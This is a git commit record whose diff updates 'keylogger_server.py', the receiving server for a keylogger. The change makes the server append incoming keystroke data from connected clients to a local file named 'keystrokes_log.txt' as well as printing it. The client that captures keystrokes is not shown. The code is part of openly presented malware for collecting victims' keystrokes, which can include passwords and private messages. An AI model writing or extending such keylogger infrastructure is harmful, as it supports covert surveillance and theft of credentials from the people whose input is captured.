d755f46bcdad1f6f2d501925a0463b4c95c7be78
hrtarsia <89439116+hrtarsia@users.noreply.github.com>
2024-10-21 06:53:51 -0400

    Update keylogger_server.py

--- keylogger_server.py
+++ keylogger_server.py
@@ -11,16 +11,23 @@ server_socket.listen(5)
 
 print(f'Server listening on {SERVER_ADDRESS}:{SERVER_PORT}')
 
+# Path to save the log file
+log_file_path = 'keystrokes_log.txt'
+
 while True:
     # Accept a connection
     client_socket, client_address = server_socket.accept()
     print(f'Connection from {client_address}')
 
-    # Receive data from the client
-    while True:
-        data = client_socket.recv(1024)
-        if not data:
-            break  # Exit if no data
-        print(data.decode('utf-8'))  # Print received data
+    # Open the log file in append mode
+    with open(log_file_path, "a") as log_file:
+        # Receive data from the client
+        while True:
+            data = client_socket.recv(1024)
+            if not data:
+                break  # Exit if no data
+            decoded_data = data.decode('utf-8')  # Decode the received data
+            print(decoded_data)  # Print received data
+            log_file.write(decoded_data)  # Write to log file
 
     client_socket.close()
